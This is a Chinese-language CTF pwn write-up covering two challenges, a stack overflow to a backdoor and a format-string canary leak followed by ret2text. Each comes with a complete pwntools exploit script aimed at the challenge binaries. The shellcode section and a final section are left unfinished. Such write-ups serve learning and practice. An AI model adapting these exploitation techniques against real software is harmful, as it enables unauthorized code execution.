CrazyCat PWN

# Day1
## ezpwn
![[Pasted image 20250210232353.png]]
输入的值与DAT_00405068一样后便可以栈溢出。
![[Pasted image 20250210232500.png]]
答案是年度最佳astrobot。
![[Pasted image 20250210232539.png]]
可以找到backdoors，构造payload即可。
exp:
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = True
if local:
	p = process('./ezpwn')
else:
	p = websocket('ws://ctf.miaoaixuan.cn/api/proxy/0194eda1-f812-771e-9167-d804f8f8a76f')

ret = 0x40101a
backdoors = 0x401539
key = b'astrobot'
p.recvuntil(b'\x21\x0a')
p.send(key)
p.recvuntil(b'something:')
payload = b'A' * 0x58 + p64(ret) + p64(backdoors)
p.sendline(payload)
p.interactive()
```
shell:
![[Pasted image 20250210232813.png]]
## fmt_str
有backdoor，开启了canary，有格式化字符串漏洞，可以用该漏洞泄漏canary。
![[Pasted image 20250210232848.png]]
有两个有用的函数，第一个当地址为0x404068的值为0x56785678时便可以进入第二步，第二步则是简单的ret2text。
第一步用格式化字符串漏洞修改0x404068的值为0x56785678即可。
exp:
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
	p = process('./fmt_str')
	pwnlib.gdb.attach(p, 'b *0x40127b')
else:
	p = websocket('ws://ctf.miaoaixuan.cn/api/proxy/0194f07e-58cc-74dd-b653-4657c29d274e')  

backdoor = 0x4013df
change_addr = 0x404068
ret = 0x40101a

p.sendlineafter(b'Input:', b'%25$p')
p.recvuntil(b'0x')
canary = int(p.recv(16), 16)
log.info(f'canary: {hex(canary)}')

payload = fmtstr_payload(8, {change_addr: 0x56785678}, write_size='byte')
p.sendlineafter(b'Input:', payload)
p.recvuntil(b'first step!')

payload2 = b'a' * 0x88 + p64(canary) + b'b' * 8 + p64(ret) + p64(backdoor)
p.sendline(payload2)

p.interactive()
```
shell:
![[Pasted image 20250210233359.png]]
## shellcode
![[Pasted image 20250210233720.png]]
可以看到是一个开启了sandbox的shellcode题。
![[Pasted image 20250210233928.png]]
sandbox仅允许使用rw,可以看到是缺o的，该怎么办呢，
shell:
![[Pasted image 20250210233827.png]]
## walt改造的编译器
